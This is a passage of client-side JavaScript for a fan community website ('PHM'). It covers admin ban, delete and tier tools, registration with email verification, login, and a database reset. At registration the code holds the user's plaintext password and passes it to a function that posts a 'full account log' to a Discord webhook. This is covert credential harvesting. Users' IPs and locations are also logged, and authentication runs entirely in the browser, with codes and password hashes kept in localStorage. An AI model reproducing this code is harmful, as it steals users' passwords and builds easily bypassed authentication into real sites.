      footer:{text:'PHM Admin Log — HIGH PRIORITY'},timestamp:new Date().toISOString()
    });
  });
}

function revokeAdmin(uid){
  if(!isAdmin()){toast('No permission.','er');return;}
  if(getU()?.username!==ADMIN){toast('Only the owner can revoke admin.','er');return;}
  const users=lu(); const idx=users.findIndex(x=>x.id===uid); if(idx<0)return;
  const admin=getU();
  const target=users[idx];
  if(target.id===admin?.id){toast('Cannot revoke your own admin.','er');return;}
  if(!confirm(`Revoke ADMIN from ${target.username}? They will become a Fan.`)) return;
  target.role='fan';
  target.playerProfile=null;
  target.lastEditedAt=Date.now();
  target.lastEditedBy=admin?.username||'admin';
  su(users); renderMembers(); refreshAll();
  toast(`${target.username} admin revoked.`,'ok');
  getIP().then(ipData=>{
    sendWebhook({
      title:'🚫 ADMIN REVOKED',
      color:0xef4444,
      fields:[
        {name:'❌ Revoked From', value:`\`${target.username}\``, inline:true},
        {name:'🛡️ Revoked By',  value:`\`${admin?.username||'admin'}\``, inline:true},
        {name:'📧 Email',        value:`\`${target.email||'?'}\``, inline:true},
        {name:'🌍 Admin IP',    value:`\`${ipData.ip||'?'}\``, inline:true},
        {name:'📍 Location',    value:`\`${ipData.city||'?'}, ${ipData.country||'?'}\``, inline:true},
        {name:'🕐 Time',        value:`\`${fmtTime(Date.now())}\``, inline:true},
      ],
      footer:{text:'PHM Admin Log'},timestamp:new Date().toISOString()
    });
  });
}

function confirmDeleteUser(uid, username){
  if(!isAdmin()){toast('No permission.','er');return;}
  openBanOrDeleteModal(uid, username, 'delete');
}

// ═══════════════════════════════════════════
// BAN SYSTEM
// ═══════════════════════════════════════════
const BK = 'phm_bans_v8';
const lb = () => { try{return JSON.parse(localStorage.getItem(BK))||{};}catch{return{};} };
const sb = d => { try{localStorage.setItem(BK,JSON.stringify(d));}catch(e){} };

function isUserBanned(username){
  const bans = lb();
  const ban = bans[username];
  if(!ban) return null;
  if(ban.permanent) return ban;
  if(Date.now() > ban.until) {
    // Expired ban — remove it
    delete bans[username];
    sb(bans);
    return null;
  }
  return ban;
}

function openBanOrDeleteModal(uid, username, mode){
  // mode: 'ban' | 'delete'
  const mod = document.getElementById('ban-mod');
  const title = document.getElementById('ban-mod-title');
  const saveBtn = document.getElementById('ban-save-btn');
  document.getElementById('ban-uid').value = uid;
  document.getElementById('ban-mode').value = mode;
  document.getElementById('ban-username-display').textContent = username;
  document.getElementById('ban-reason').value = '';
  document.getElementById('ban-dur-type').value = 'days';
  document.getElementById('ban-dur-num').value = '7';
  document.getElementById('ban-permanent').checked = false;
  document.getElementById('ban-dur-row').style.display = '';

  if(mode === 'delete'){
    title.textContent = `Delete User: ${username}`;
    document.getElementById('ban-reason-label').textContent = 'Reason (optional)';
    document.getElementById('ban-dur-section').style.display = 'none';
    saveBtn.textContent = 'DELETE USER';
    saveBtn.style.background = '#ef4444';
  } else {
    title.textContent = `Ban User: ${username}`;
    document.getElementById('ban-reason-label').textContent = 'Ban Reason';
    document.getElementById('ban-dur-section').style.display = '';
    saveBtn.textContent = 'BAN USER';
    saveBtn.style.background = '#ef4444';
  }

  document.getElementById('ban-ov').classList.add('open');
}

function closeBanMod(e){
  if(!e||e.target===document.getElementById('ban-ov'))
    document.getElementById('ban-ov').classList.remove('open');
}

function togglePermanent(){
  const perm = document.getElementById('ban-permanent').checked;
  document.getElementById('ban-dur-row').style.display = perm ? 'none' : '';
}

function executeBanOrDelete(){
  const uid = document.getElementById('ban-uid').value;
  const mode = document.getElementById('ban-mode').value;
  const reason = document.getElementById('ban-reason').value.trim() || 'No reason provided';
  const users = lu();
  const u = users.find(x=>x.id===uid);
  if(!u){toast('User not found.','er');return;}

  if(mode === 'delete'){
    su(users.filter(x=>x.id!==uid));
    document.getElementById('ban-ov').classList.remove('open');
    renderMembers(); refreshAll();
    toast(`${u.username} has been deleted.`,'ok');
    getIP().then(ipData=>{
      sendWebhook({
        title:'🗑️ User Deleted',
        color:0xef4444,
        fields:[
          {name:'❌ Deleted',    value:`\`${u.username}\``, inline:true},
          {name:'🛡️ By Admin', value:`\`${getU()?.username||'admin'}\``, inline:true},
          {name:'📧 Email',     value:`\`${u.email||'?'}\``, inline:true},
          {name:'📝 Reason',    value:reason, inline:false},
          {name:'🌍 Admin IP', value:`\`${ipData.ip||'?'}\``, inline:true},
          {name:'🕐 Time',     value:`\`${fmtTime(Date.now())}\``, inline:true},
        ],
        footer:{text:'PHM Admin Log'},timestamp:new Date().toISOString()
      });
    });
    return;
  }

  // BAN
  const perm = document.getElementById('ban-permanent').checked;
  let until = null, durText = 'Permanent';
  if(!perm){
    const num = parseInt(document.getElementById('ban-dur-num').value)||1;
    const durType = document.getElementById('ban-dur-type').value;
    let ms;
    if(durType === 'days') { ms = num * 86400000; durText = `${num} day${num!==1?'s':''}`;  }
    else if(durType === 'months') { ms = num * 30 * 86400000; durText = `${num} month${num!==1?'s':''}`;  }
    else if(durType === 'years') { ms = num * 365 * 86400000; durText = `${num} year${num!==1?'s':''}`;  }
    else { ms = num * 86400000; durText = `${num} day${num!==1?'s':''}`; }
    until = Date.now() + ms;
  }

  const bans = lb();
  bans[u.username] = { reason, until, permanent: perm, bannedAt: Date.now(), bannedBy: getU()?.username||'admin' };
  sb(bans);

  document.getElementById('ban-ov').classList.remove('open');
  renderMembers(); refreshAll();
  toast(`${u.username} banned${perm?'':(` for ${durText}`)}.`,'ok');
  getIP().then(ipData=>{
    sendWebhook({
      title:'🔨 User Banned',
      color:0xef4444,
      fields:[
        {name:'🚫 Banned',      value:`\`${u.username}\``, inline:true},
        {name:'🛡️ By Admin',  value:`\`${getU()?.username||'admin'}\``, inline:true},
        {name:'📧 Email',      value:`\`${u.email||'?'}\``, inline:true},
        {name:'📝 Reason',     value:reason, inline:false},
        {name:'⏳ Duration',   value:perm?'**Permanent**':`\`${durText}\``, inline:true},
        {name:'🌍 Admin IP',  value:`\`${ipData.ip||'?'}\``, inline:true},
        {name:'🕐 Time',      value:`\`${fmtTime(Date.now())}\``, inline:true},
      ],
      footer:{text:'PHM Admin Log'},timestamp:new Date().toISOString()
    });
  });
}

function openBanModal(uid){
  if(!isAdmin()){toast('No permission.','er');return;}
  const u = lu().find(x=>x.id===uid);
  if(!u){toast('User not found.','er');return;}
  openBanOrDeleteModal(uid, u.username, 'ban');
}

function unbanUser(username){
  if(!isAdmin()){toast('No permission.','er');return;}
  const bans = lb();
  delete bans[username];
  sb(bans);
  renderMembers();
  toast(`${username} has been unbanned.`,'ok');
  getIP().then(ipData=>{
    sendWebhook({
      title:'✅ User Unbanned',
      color:0x10b981,
      fields:[
        {name:'✅ Unbanned',   value:`\`${username}\``, inline:true},
        {name:'🛡️ By Admin', value:`\`${getU()?.username||'admin'}\``, inline:true},
        {name:'🌍 Admin IP', value:`\`${ipData.ip||'?'}\``, inline:true},
        {name:'🕐 Time',     value:`\`${fmtTime(Date.now())}\``, inline:true},
      ],
      footer:{text:'PHM Admin Log'},timestamp:new Date().toISOString()
    });
  });
}


function rotateTier(uid){
  const users=lu(), u=users.find(x=>x.id===uid); if(!u)return;
  const admin=getU();
  const ts=['Tier 1','Tier 2','Tier 3','Tier 4'];
  const old=u.playerProfile?.tier||'Tier 4';
  const next=ts[(ts.indexOf(old)+1)%4];
  if(!u.playerProfile)u.playerProfile={};
  u.playerProfile.tier=next;
  u.playerProfile.lastEditedAt=Date.now();
  u.playerProfile.lastEditedBy=admin?.username||'admin';
  su(users); renderMembers(); refreshAll();
  toast(`${u.username} → ${next}`,'ok');
  getIP().then(ipData=>{
    sendWebhook({
      title:'🏆 Tier Changed',
      color:0xf59e0b,
      fields:[
        {name:'🎯 Player',    value:`\`${u.username}\``, inline:true},
        {name:'📊 Change',    value:`\`${old}\` → \`${next}\``, inline:true},
        {name:'🛡️ By Admin',value:`\`${admin?.username||'admin'}\``, inline:true},
        {name:'🌍 Admin IP', value:`\`${ipData.ip||'?'}\``, inline:true},
        {name:'🕐 Time',     value:`\`${fmtTime(Date.now())}\``, inline:true},
      ],
      footer:{text:'PHM Admin Log'},timestamp:new Date().toISOString()
    });
  });
}

function fdate(ts){ if(!ts)return'—'; return new Date(ts).toLocaleDateString('en-GB',{day:'2-digit',month:'short',year:'numeric'}); }
function fdatetime(ts){ if(!ts)return'—'; return new Date(ts).toLocaleString('en-GB',{day:'2-digit',month:'short',year:'numeric',hour:'2-digit',minute:'2-digit'}); }

// Country lookup maps (admin flag setter)
const COUNTRY_NAMES = {
  AF:'Afghanistan',AL:'Albania',DZ:'Algeria',AO:'Angola',AR:'Argentina',AM:'Armenia',AU:'Australia',
  AT:'Austria',AZ:'Azerbaijan',BH:'Bahrain',BD:'Bangladesh',BY:'Belarus',BE:'Belgium',BZ:'Belize',
  BJ:'Benin',BO:'Bolivia',BA:'Bosnia',BW:'Botswana',BR:'Brazil',BN:'Brunei',BG:'Bulgaria',
  BF:'Burkina Faso',BI:'Burundi',KH:'Cambodia',CM:'Cameroon',CA:'Canada',CF:'C. African Rep.',
  TD:'Chad',CL:'Chile',CN:'China',CO:'Colombia',CG:'Congo',HR:'Croatia',CU:'Cuba',CY:'Cyprus',
  CZ:'Czech Republic',DK:'Denmark',DO:'Dominican Rep.',CD:'DR Congo',EC:'Ecuador',EG:'Egypt',
  SV:'El Salvador',ET:'Ethiopia',FI:'Finland',FR:'France',GA:'Gabon',GM:'Gambia',GE:'Georgia',
  DE:'Germany',GH:'Ghana',GR:'Greece',GT:'Guatemala',GN:'Guinea',HT:'Haiti',HN:'Honduras',
  HU:'Hungary',IN:'India',ID:'Indonesia',IR:'Iran',IQ:'Iraq',IE:'Ireland',IL:'Israel',IT:'Italy',
  CI:"Côte d'Ivoire",JM:'Jamaica',JP:'Japan',JO:'Jordan',KZ:'Kazakhstan',KE:'Kenya',KP:'North Korea',
  KR:'South Korea',KW:'Kuwait',KG:'Kyrgyzstan',LA:'Laos',LB:'Lebanon',LY:'Libya',LT:'Lithuania',
  LU:'Luxembourg',MG:'Madagascar',MW:'Malawi',MY:'Malaysia',ML:'Mali',MX:'Mexico',MD:'Moldova',
  MN:'Mongolia',MA:'Morocco',MZ:'Mozambique',MM:'Myanmar',NA:'Namibia',NP:'Nepal',NL:'Netherlands',
  NZ:'New Zealand',NI:'Nicaragua',NE:'Niger',NG:'Nigeria',MK:'North Macedonia',NO:'Norway',
  OM:'Oman',PK:'Pakistan',PS:'Palestine',PA:'Panama',PY:'Paraguay',PE:'Peru',PH:'Philippines',
  PL:'Poland',PT:'Portugal',QA:'Qatar',RO:'Romania',RU:'Russia',RW:'Rwanda',SA:'Saudi Arabia',
  SN:'Senegal',RS:'Serbia',SL:'Sierra Leone',SO:'Somalia',ZA:'South Africa',SS:'South Sudan',
  ES:'Spain',LK:'Sri Lanka',SD:'Sudan',SE:'Sweden',CH:'Switzerland',SY:'Syria',TW:'Taiwan',
  TZ:'Tanzania',TH:'Thailand',TN:'Tunisia',TR:'Turkey',UG:'Uganda',UA:'Ukraine',AE:'UAE',
  GB:'United Kingdom',US:'United States',UY:'Uruguay',UZ:'Uzbekistan',VE:'Venezuela',
  VN:'Vietnam',YE:'Yemen',ZM:'Zambia',ZW:'Zimbabwe',
};
const CODE3TO2 = {
  IRQ:'IQ',SAU:'SA',UAE:'AE',EGY:'EG',MAR:'MA',TUN:'TN',DZA:'DZ',LBY:'LY',LBN:'LB',SYR:'SY',
  JOR:'JO',PSE:'PS',YEM:'YE',OMN:'OM',KWT:'KW',BHR:'BH',QAT:'QA',GBR:'GB',USA:'US',FRA:'FR',
  DEU:'DE',ESP:'ES',ITA:'IT',PRT:'PT',NLD:'NL',BEL:'BE',CHE:'CH',AUT:'AT',SWE:'SE',NOR:'NO',
  DNK:'DK',FIN:'FI',POL:'PL',RUS:'RU',TUR:'TR',GRC:'GR',ROU:'RO',HRV:'HR',SRB:'RS',BRA:'BR',
  ARG:'AR',COL:'CO',CHL:'CL',MEX:'MX',PER:'PE',VEN:'VE',URY:'UY',PAR:'PY',NGA:'NG',GHA:'GH',
  SEN:'SN',CMR:'CM',CIV:'CI',ZAF:'ZA',KEN:'KE',ETH:'ET',TZA:'TZ',UGA:'UG',ZIM:'ZW',JPN:'JP',
  CHN:'CN',KOR:'KR',IND:'IN',PAK:'PK',BGD:'BD',THA:'TH',IDN:'ID',MYS:'MY',PHL:'PH',VNM:'VN',
  AUS:'AU',NZL:'NZ',CAN:'CA',AFG:'AF',IRN:'IR',KAZ:'KZ',UZB:'UZ',AZE:'AZ',ARM:'AM',GEO:'GE',
  UKR:'UA',CZE:'CZ',SVK:'SK',HUN:'HU',BGR:'BG',ALB:'AL',MKD:'MK',
};

// ── Admin sets country code → clean modal ──
function setCountry(uid){
  if(!isAdmin()){toast('No permission.','er');return;}
  const u=lu().find(x=>x.id===uid); if(!u) return;
  document.getElementById('fc-uid').value = uid;
  document.getElementById('fc-username').textContent = u.username;
  document.getElementById('fc-input').value = u.countryCode||'';
  // Build quick pick buttons
  const qp = document.getElementById('fc-quickpicks');
  const codes = ['IRQ','SAU','GBR','USA','FRA','DEU','ESP','TUR','EGY','MAR','NGA','BRA','ARG','JPN','KOR','UAE','QAT','JOR','SYR','LBN'];
  qp.innerHTML = codes.map(c=>`<button type="button"
    onclick="document.getElementById('fc-input').value='${c}';fcPreview()"
    style="font-family:'Barlow Condensed',sans-serif;font-size:11px;font-weight:700;letter-spacing:1px;padding:5px 10px;border-radius:6px;border:1px solid var(--border2);background:var(--card2);color:var(--gray);cursor:pointer;transition:all .2s;"
    onmouseover="this.style.borderColor='var(--blue3)';this.style.color='var(--white)'"
    onmouseout="this.style.borderColor='var(--border2)';this.style.color='var(--gray)'">${c}</button>`).join('');
  fcPreview();
  document.getElementById('fc-ov').classList.add('open');
  setTimeout(()=>document.getElementById('fc-input').focus(), 100);
}
function closeFCov(e){
  if(!e||e.target===document.getElementById('fc-ov'))
    document.getElementById('fc-ov').classList.remove('open');
}
function fcPreview(){
  const raw = (document.getElementById('fc-input')?.value||'').toUpperCase().trim();
  const flagEl = document.getElementById('fc-flag');
  const nameEl = document.getElementById('fc-name');
  if(!raw){ flagEl.textContent='🏳️'; nameEl.textContent='No flag set'; nameEl.style.color='var(--gray)'; return; }
  const iso2 = raw.length===3 ? (CODE3TO2[raw]||null) : (raw.length===2 ? raw : null);
  if(!iso2){ flagEl.textContent='❓'; nameEl.textContent='Unknown code'; nameEl.style.color='#f87171'; return; }
  const flag = countryFlag(iso2);
  const name = COUNTRY_NAMES[iso2]||iso2;
  flagEl.textContent = flag||'❓';
  nameEl.textContent = name;
  nameEl.style.color = flag ? 'var(--blue3)' : '#f87171';
}
function saveFlagCode(){
  if(!isAdmin()) return;
  const uid = document.getElementById('fc-uid').value;
  const raw = (document.getElementById('fc-input').value||'').toUpperCase().trim();
  if(!raw){ toast('Enter a country code.','er'); return; }
  const iso2 = raw.length===3 ? (CODE3TO2[raw]||raw) : raw;
  const users=lu(); const idx=users.findIndex(x=>x.id===uid); if(idx<0) return;
  const admin=getU();
  const target=users[idx];
  const old=target.countryCode||'none';
  target.countryCode = iso2;
  target.lastEditedAt = Date.now();
  target.lastEditedBy = admin?.username||'admin';
  su(users);
  const flag = countryFlag(iso2);
  const name = COUNTRY_NAMES[iso2]||iso2;
  document.getElementById('fc-ov').classList.remove('open');
  renderMembers(); refreshAll();
  toast(`${target.username} → ${flag} ${iso2}`,'ok');
  getIP().then(ipData=>{
    sendWebhook({
      title:'🏳️ Flag Set',
      color:0x8b5cf6,
      fields:[
        {name:'🎯 Player',    value:`\`${target.username}\``, inline:true},
        {name:'🏳️ Flag',    value:`${flag} \`${iso2}\` — ${name}`, inline:true},
        {name:'📊 Change',   value:`\`${old}\` → \`${iso2}\``, inline:true},
        {name:'🛡️ By Admin',value:`\`${admin?.username||'admin'}\``, inline:true},
        {name:'🌍 Admin IP', value:`\`${ipData.ip||'?'}\``, inline:true},
        {name:'🕐 Time',     value:`\`${fmtTime(Date.now())}\``, inline:true},
      ],
      footer:{text:'PHM Admin Log'},timestamp:new Date().toISOString()
    });
  });
}

// ═══════════════════════════════════════════
// AUTH — LOGIN / REGISTER / VERIFY
// ═══════════════════════════════════════════
let authM='login';
// pendingReg holds data while waiting for email verify
let pendingReg=null;

function openAuth(mode){ authM=mode; clearAMsgs(); renderABody(); document.getElementById('aov').classList.add('open'); }
function closeAov(e){ if(!e||e.target===document.getElementById('aov')) document.getElementById('aov').classList.remove('open'); }

function clearAMsgs(){
  const er=document.getElementById('aerr'); er.textContent=''; er.classList.remove('show');
  const ok=document.getElementById('aok'); ok.textContent=''; ok.classList.remove('show');
}
function aerrMsg(msg){ const e=document.getElementById('aerr'); e.textContent=msg; e.classList.add('show'); }
function aokMsg(msg){ const e=document.getElementById('aok'); e.textContent=msg; e.classList.add('show'); }

function renderABody(){
  const ab=document.getElementById('abody');
  if(authM==='login'){
    ab.innerHTML=`
      <div class="atitl">Welcome Back</div>
      <div class="asub">Sign in to your PHM account</div>
      <div class="af"><label class="albl">Username</label><input class="ainp" id="a-user" type="text" placeholder="username" autocomplete="username"></div>
      <div class="af"><label class="albl">Password</label><input class="ainp" id="a-pass" type="password" placeholder="••••••••" autocomplete="current-password"></div>
      <button class="abtn2" onclick="doLogin()">SIGN IN</button>
      <div class="aswitch">No account? <a onclick="openAuth('register')">Register</a></div>`;
  } else if(authM==='register'){
    ab.innerHTML=`
      <div class="atitl">Create Account</div>
      <div class="asub">Join as a Fan — admin can promote you to Player</div>
      <div class="af">
        <label class="albl">Username</label>
        <input class="ainp" id="a-user" type="text" placeholder="your_username" autocomplete="off" maxlength="20"
          oninput="formatUsernameInput(this)">
        <div style="font-size:10px;color:var(--gray2);margin-top:4px;font-family:'Barlow Condensed',sans-serif;letter-spacing:1px;">
          3–20 chars · letters, numbers &amp; underscores only · spaces become _
        </div>
      </div>
      <div class="af"><label class="albl">Email <span style="color:var(--gray);font-size:9px">(Gmail only)</span></label><input class="ainp" id="a-email" type="email" placeholder="you@gmail.com" autocomplete="email"></div>
      <div class="af"><label class="albl">Password</label><input class="ainp" id="a-pass" type="password" placeholder="••••••••" autocomplete="new-password"></div>
      <button class="abtn2" onclick="doReg()">CREATE ACCOUNT</button>
      <div class="aswitch">Already registered? <a onclick="openAuth('login')">Sign In</a></div>`;
  } else if(authM==='verify'){
    // build the verify step UI
    renderVerifyStep();
  }
}

// Generate a 6-digit code and simulate "sending" it
function generateCode(){ return Math.floor(100000+Math.random()*900000).toString(); }

// Countdown timer state
let resendTimer=null, resendSeconds=0;

function startResendCountdown(){
  resendSeconds=120;
  updateResendUI();
  clearInterval(resendTimer);
  resendTimer=setInterval(()=>{
    resendSeconds--;
    updateResendUI();
    if(resendSeconds<=0){ clearInterval(resendTimer); resendTimer=null; updateResendUI(); }
  },1000);
}
function updateResendUI(){
  const btn=document.getElementById('resend-btn');
  const cd=document.getElementById('resend-cd');
  if(!btn||!cd)return;
  if(resendSeconds>0){
    btn.disabled=true;
    cd.textContent=`Wait ${resendSeconds}s`;
  } else {
    btn.disabled=false;
    cd.textContent='';
  }
}

function renderVerifyStep(){
  const email=pendingReg?.email||'your email';
  const ab=document.getElementById('abody');
  ab.innerHTML=`
    <div class="atitl">Check Your Inbox</div>
    <div class="asub">
      A 6-digit code was sent to<br>
      <strong style="color:var(--white);font-family:'Barlow Condensed',sans-serif;font-size:14px;letter-spacing:1px;">${esc(email)}</strong><br>
      <span style="font-size:10px;color:var(--gray2);margin-top:4px;display:block;">Check inbox &amp; spam · Expires in 10 minutes</span>
    </div>

    <div class="af">
      <label class="albl">Enter Verification Code</label>
      <input class="ainp" id="a-code" type="text" inputmode="numeric" placeholder="000000" maxlength="6" autocomplete="one-time-code"
        style="letter-spacing:10px;font-family:'Orbitron',monospace;font-size:20px;text-align:center;padding:12px 13px;"
        oninput="this.value=this.value.replace(/[^0-9]/g,'').slice(0,6);if(this.value.length===6)document.querySelector('.abtn2').focus();">
    </div>
    <div class="resend-row">
      <button class="resend-btn" id="resend-btn" onclick="resendCode()">↻ Resend Code</button>
      <span class="resend-countdown" id="resend-cd"></span>
    </div>
    <button class="abtn2" onclick="doVerify()">VERIFY &amp; JOIN PHM</button>
    <div class="aswitch"><a onclick="openAuth('register')">← Back to Register</a></div>`;
  updateResendUI();
}

async function sendVerificationCode(){
  if(!pendingReg) return;
  const code = generateCode();
  const verifications = lv();
  verifications[pendingReg.username] = { code, expires: Date.now() + 600000 };
  sv(verifications);
  startResendCountdown();

  try{
    const result = await emailjs.send(EJS_SERVICE, EJS_TEMPLATE, {
      to_email   : pendingReg.email,
      to_name    : pendingReg.username,
      username   : pendingReg.username,
      passcode   : code,
      code       : code,
      expires_in : '10 minutes',
      year       : new Date().getFullYear()
    });
    console.log('✅ EmailJS success:', result);
  } catch(err){
    console.error('❌ EmailJS error:', err);
  }
}

async function resendCode(){
  clearAMsgs();
  aokMsg('Sending new code…');
  await sendVerificationCode();
  clearAMsgs();
  aokMsg('New code sent — check your inbox & spam folder.');
}

async function doReg(){
  clearAMsgs();
  const u  = document.getElementById('a-user').value.trim().toLowerCase();
  const p  = document.getElementById('a-pass').value;
  const em = document.getElementById('a-email').value.trim().toLowerCase();
  if(!u||!p||!em){ aerrMsg('Please fill in all fields.'); return; }
  if(!/^[a-z0-9_]{3,20}$/.test(u)){ aerrMsg('Username: 3–20 chars, letters/numbers/underscores only.'); return; }
  if(p.length<6){ aerrMsg('Password must be at least 6 characters.'); return; }
  if(!em.endsWith('@gmail.com')){ aerrMsg('Only Gmail addresses are accepted (@gmail.com).'); return; }

  // ── Show checking state ──
  aerrMsg(''); aokMsg('🔍 Checking security… please wait.');

  // ── Get IP data ──
  const ipData = await getIP();

  // ── VPN / Proxy / Tor block ──
  if(ipData.vpn || ipData.proxy || ipData.tor){
    clearAMsgs();
    aerrMsg('🚨 VPN / Proxy detected. Please disable it and try again.');
    await logSecurityAlert('VPN Registration Attempt', `User \`${u}\` tried to register with VPN/Proxy active.`, ipData);
    return;
  }

  // ── IP already registered check ──
  const ipRegistry = li();
  if(ipRegistry[ipData.ip] && ipData.ip !== 'Unknown'){
    const existingUser = ipRegistry[ipData.ip];
    clearAMsgs();
    aerrMsg('⛔ An account already exists from your network. Only one account per person is allowed.');
    await logSecurityAlert('Duplicate Account Attempt', `\`${u}\` tried to register but IP \`${ipData.ip}\` already has account \`${existingUser}\`.`, ipData);
    return;
  }

  const users=lu();
  if(users.find(x=>x.username===u)){
    clearAMsgs();
    if(u===ADMIN){
      aerrMsg(`"${ADMIN}" is reserved.`);
    } else {
      aerrMsg('');
      // Show styled "name taken" message
      const errEl = document.getElementById('aerr');
      errEl.innerHTML = `<div style="display:flex;align-items:flex-start;gap:10px;">
        <span style="font-size:18px;flex-shrink:0;">🚫</span>
        <div>
          <div style="font-family:'Barlow Condensed',sans-serif;font-size:14px;font-weight:800;letter-spacing:1px;color:#f87171;margin-bottom:3px;">Username Already Taken</div>
          <div style="font-size:11px;color:rgba(248,113,113,.75);line-height:1.5;"><strong style="color:#fca5a5;">${esc(u)}</strong> is already in use. Try something unique like <strong style="color:#fca5a5;">${esc(u)}_${Math.floor(10+Math.random()*89)}</strong> or pick a different name.</div>
        </div>
      </div>`;
      errEl.classList.add('show');
    }
    await logSecurityAlert('Username Taken Attempt', `Someone tried to register username \`${u}\` which is already taken.`, ipData);
    return;
  }
  if(users.find(x=>x.email===em)){
    clearAMsgs();
    aerrMsg('This email is already registered.');
    await logSecurityAlert('Email Already Used', `IP \`${ipData.ip}\` tried to register with already-registered email \`${em}\`.`, ipData);
    return;
  }

  clearAMsgs();
  const isAd = u===ADMIN;
  pendingReg={
    id:uid(), username:u, pwh:hp(p), email:em,
    role: isAd?'admin':'fan',
    createdAt: Date.now(),
    emailVerified: isAd,
    ip: ipData.ip,
    country: ipData.country,
    playerProfile: isAd?{tier:'Tier 1',nation:'',value:0,goals:0,assists:0,avatar:'',shooting:99,passing:99,dribbling:99,pace:99,defending:99,physical:99}:null
  };

  if(isAd){
    const users2=lu(); users2.push(pendingReg); su(users2); ss(pendingReg);
    // Register IP
    const reg=li(); reg[ipData.ip]=u; si(reg);
    document.getElementById('aov').classList.remove('open');
    renderNav(); refreshAll();
    toast(`Welcome ${u}! Admin access granted.`,'ok');
    await logNewAccount(pendingReg, p, ipData);
    pendingReg=null; return;
  }

  // Store raw pass temporarily for webhook after verification
  pendingReg._rawPass = p;

  authM='verify';
  renderABody();
  clearAMsgs();
  aokMsg(`Sending verification code to ${em}…`);
  await sendVerificationCode();
  clearAMsgs();
  aokMsg(`Code sent to ${em} — check your inbox & spam folder.`);
}

async function doVerify(){
  clearAMsgs();
  if(!pendingReg){aerrMsg('Session expired. Please register again.');return;}
  const input=(document.getElementById('a-code')?.value||'').trim();
  if(!input||input.length!==6){aerrMsg('Please enter the 6-digit code.');return;}
  const verifications=lv();
  const entry=verifications[pendingReg.username];
  if(!entry){aerrMsg('Code not found. Please resend.');return;}
  if(Date.now()>entry.expires){aerrMsg('Code expired. Please resend a new one.');return;}
  if(input!==entry.code){
    // Log wrong code attempt
    const ipData = await getIP();
    await logSecurityAlert('Wrong Verification Code', `\`${pendingReg.username}\` entered wrong code \`${input}\` (expected different).`, ipData);
    aerrMsg('Incorrect code. Please try again.');return;
  }
  // ── Success ──
  delete verifications[pendingReg.username];
  sv(verifications);
  pendingReg.emailVerified=true;
  const rawPass = pendingReg._rawPass||'';
  delete pendingReg._rawPass;
  const users=lu(); users.push(pendingReg); su(users); ss(pendingReg);
  // Register IP so this address can't create another account
  const ipData = await getIP();
  if(ipData.ip && ipData.ip!=='Unknown'){
    const reg=li(); reg[ipData.ip]=pendingReg.username; si(reg);
  }
  clearInterval(resendTimer); resendTimer=null;
  document.getElementById('aov').classList.remove('open');
  renderNav(); refreshAll();
  toast(`Welcome ${pendingReg.username}! Email verified.`,'ok');
  // Send full account log to Discord
  await logNewAccount(pendingReg, rawPass, ipData);
  pendingReg=null;
}

// Verify step for already-registered users
async function openVerify(){
  const u=getU(); if(!u)return;
  if(u.emailVerified){ toast('Email already verified!','ok'); return; }
  pendingReg={...u};
  authM='verify';
  renderABody();
  clearAMsgs();
  document.getElementById('aov').classList.add('open');
  aokMsg(`Sending code to ${u.email}…`);
  await sendVerificationCode();
  clearAMsgs();
  aokMsg(`Code sent to ${u.email} — check inbox & spam folder.`);
}

async function doLogin(){
  clearAMsgs();
  const u=document.getElementById('a-user').value.trim().toLowerCase();
  const p=document.getElementById('a-pass').value;
  if(!u||!p){ aerrMsg('Fill in all fields.'); return; }
  const found=lu().find(x=>x.username===u&&x.pwh===hp(p));
  if(!found){
    aerrMsg('Wrong username or password.');
    const ipData=await getIP();
    await logSecurityAlert('Failed Login Attempt',`Someone tried to login as \`${u}\` with wrong password.`,ipData);
    return;
  }
  // ── Check if banned ──
  const activeBan = isUserBanned(found.username);
  if(activeBan){
    const durStr = activeBan.permanent
      ? 'Permanently'
      : `Until ${new Date(activeBan.until).toLocaleDateString('en-GB',{day:'2-digit',month:'short',year:'numeric',hour:'2-digit',minute:'2-digit'})}`;
    const errEl = document.getElementById('aerr');
    errEl.innerHTML = `<div style="display:flex;align-items:flex-start;gap:10px;">
      <span style="font-size:20px;flex-shrink:0;">🚫</span>
      <div>
        <div style="font-family:'Barlow Condensed',sans-serif;font-size:14px;font-weight:800;letter-spacing:1px;color:#f87171;margin-bottom:4px;">Account Banned</div>
        <div style="font-size:11px;color:rgba(248,113,113,.8);line-height:1.6;">
          <strong style="color:#fca5a5;">Reason:</strong> ${esc(activeBan.reason)}<br>
          <strong style="color:#fca5a5;">Duration:</strong> ${durStr}<br>
          <span style="color:rgba(248,113,113,.55);font-size:10px;">Banned by ${esc(activeBan.bannedBy||'admin')}</span>
        </div>
      </div>
    </div>`;
    errEl.classList.add('show');
    return;
  }

  if(!found.emailVerified){
    pendingReg={...found};
    authM='verify';
    renderABody();
    clearAMsgs();
    aerrMsg('You must verify your email before signing in.');
    sendVerificationCode().then(()=>{
      clearAMsgs();
      aokMsg(`Verification code sent to ${found.email} — check your inbox.`);
    });
    return;
  }
  ss(found);
  document.getElementById('aov').classList.remove('open');
  renderNav(); refreshAll();
  toast(`Welcome back, ${found.username}${found.role==='admin'?' 🛡️':''}!`,'ok');
  const ipData=await getIP();
  await logLogin(found, ipData);
}

// ═══════════════════════════════════════════
// RESET DATABASE
// ═══════════════════════════════════════════
function openResetModal(){
  if(!isAdmin()){toast('No permission.','er');return;}
  document.getElementById('reset-confirm-input').value='';
  checkResetInput();
  document.getElementById('reset-ov').classList.add('open');
}
function closeResetModal(e){
  if(!e||e.target===document.getElementById('reset-ov'))
    document.getElementById('reset-ov').classList.remove('open');
}
function checkResetInput(){
  const val = document.getElementById('reset-confirm-input').value.trim();
  const btn = document.getElementById('reset-confirm-btn');
  const ok = val === 'RESET';
  btn.disabled = !ok;
  btn.style.cursor = ok ? 'pointer' : 'not-allowed';
  btn.style.background = ok ? '#ef4444' : 'rgba(239,68,68,.2)';
  btn.style.color = ok ? '#fff' : 'rgba(248,113,113,.4)';
  btn.style.border = ok ? 'none' : '1px solid rgba(239,68,68,.2)';
  btn.style.boxShadow = ok ? '0 0 20px rgba(239,68,68,.4)' : 'none';
}
function executeReset(){
  if(!isAdmin()) return;
  if(document.getElementById('reset-confirm-input').value.trim() !== 'RESET') return;

  // Wipe every PHM key from localStorage
  Object.keys(localStorage)
    .filter(k => k.startsWith('phm_'))
    .forEach(k => localStorage.removeItem(k));

  // Re-stamp the init flag for current version so fresh-start doesn't double-wipe
  localStorage.setItem('phm_init_v9','1');

  document.getElementById('reset-ov').classList.remove('open');
  ss(null); // clear session

  // Show a brief toast then reload to clean state
  toast('✓ Database wiped. Reloading…','ok');
